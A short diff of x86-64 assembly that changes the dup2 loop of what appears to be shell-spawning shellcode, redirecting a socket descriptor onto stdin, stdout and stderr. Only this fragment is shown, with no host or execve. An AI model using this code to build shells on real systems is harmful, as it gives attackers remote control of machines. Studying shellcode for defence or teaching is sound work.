@@ -75,16 +75,16 @@ _start:
 	
 
 	; (sockfd, {2,1,0})
-	xor rcx, rcx
-	; xchg rdi, rax
-	mov cl, 3
+	push rax
+	push 0x3
+	pop rcx
 dup2loop:
 	dec cl
 	mov al, 33
-	mov sil, cl
 	push rcx
+	pop rsi 
 	syscall
-	pop rcx
+	mov rcx, rsi
 	jnz dup2loop
 	
 
